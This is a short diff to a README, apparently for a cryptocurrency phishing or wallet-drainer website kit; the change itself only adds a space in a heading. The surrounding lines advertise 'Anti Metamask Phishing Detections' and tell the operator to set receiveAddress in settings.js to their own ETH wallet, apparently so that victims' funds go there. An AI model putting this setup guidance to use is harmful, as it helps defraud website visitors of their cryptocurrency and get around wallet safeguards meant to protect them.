@@ -15,7 +15,7 @@
 - [x] Anti Metamask Phishing Detections
 
 
-# 👻Guide: 
+# 👻 Guide: 
 In order to use this website, you need to edit the **settings.js** file. 
 On line 1: const receiveAddress = "YOUR WALLET"; replace **YOUR WALLET with your ETH wallet address.**
 
